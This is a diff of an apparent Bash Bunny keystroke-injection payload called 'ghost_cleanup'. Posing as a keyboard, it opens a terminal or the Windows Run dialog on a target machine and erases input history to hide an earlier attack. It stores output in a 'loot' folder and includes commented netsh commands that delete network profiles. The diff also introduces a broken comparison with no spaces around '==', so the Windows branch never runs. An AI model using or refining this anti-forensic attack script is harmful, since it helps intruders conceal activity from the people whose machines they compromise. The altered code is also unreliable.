@@ -9,24 +9,45 @@
 # Cleans the input history on Windows, Mac and Linux
 #
 
-# EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : ALL
-LINES = 0
+#+++ CONFIG +++
+
+DEBUG=true
+
+# EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : 0 = ALL
+LINES=0
+
+#+++ END CONFIG +++
+
+
+DEBUG_FILE="/dev/null"
+if [ "$DEBUG" ]; then
+    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
+    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
+      mkdir /root/udisk/loot
+      mkdir /root/udisk/loot/ghost_cleanup
+    fi
+    touch "${DEBUG_FILE}"
+fi
+echo "Hold on to your butts" > "${DEBUG_FILE}"
 
 # PLATFORM CHECK
-# LOOTFILE CHECK - DEFAULT MAC / LINUX.
-# FOR WINDOWS, CREATE FILE '/root/udisk/loot/ghost_cleanup_win' IN YOUR FIRST PAYLOAD.
+# LOOTFILE CHECK - DEFAULT PLATFORM: MAC / LINUX.
+# FOR WINDOWS, CREATE FILE '/root/udisk/loot/ghost_cleanup/win_switch' IN YOUR FIRST PAYLOAD.
 
-if [ -f /root/udisk/loot/ghost_cleanup_win ]; then
-    PLATFORM_COMMAND = "cmd"
+if [ -f "/root/udisk/loot/ghost_cleanup/win_switch" ]; then
+    LED B
+    echo "WINDOWS" > "${DEBUG_FILE}"
+    PLATFORM_COMMAND="cmd"
 else
-    PLATFORM_COMMAND = "terminal"
+    LED O
+    echo "MAC / LINUX" > "${DEBUG_FILE}"
+    PLATFORM_COMMAND="terminal"
 fi
 
 # START
-LED R
-ATTACKMODE HID STORAGE
+ATTACKMODE HID
 
-QUACK DELAY 1000
+QUACK DELAY 500
 QUACK ALT F2
 QUACK DELAY 50
 QUACK GUI SPACE
@@ -34,12 +55,12 @@ QUACK DELAY 50
 QUACK GUI r
 QUACK BACKSPACE
 QUACK DELAY 100
-QUACK STRING $PLATFORM_COMMAND
+QUACK STRING "${PLATFORM_COMMAND}"
 QUACK ENTER
-QUACK DELAY 1000
+QUACK DELAY 10000
 
 # PLATFORM COMMANDS
-if [ $PLATFORM_COMMAND == "terminal" ]; then
+if [ $PLATFORM_COMMAND=="terminal" ]; then
 # MAC / LINUX
     #++ INSERT CUSTOM MAC / LINUX CLEANUP GOODNESS ++
 
@@ -58,7 +79,7 @@ else
     # QUACK STRING netsh show profiles
     # QUACK ENTER
     # QUACK DELAY 100
-    # todo ADAPTER = Get last ethernet adapter
+    # todo ADAPTER=Get last ethernet adapter
     # QUACK ENTER
     # QUACK STRING netsh delete profile interface= $ADAPTER
     # QUACK ENTER
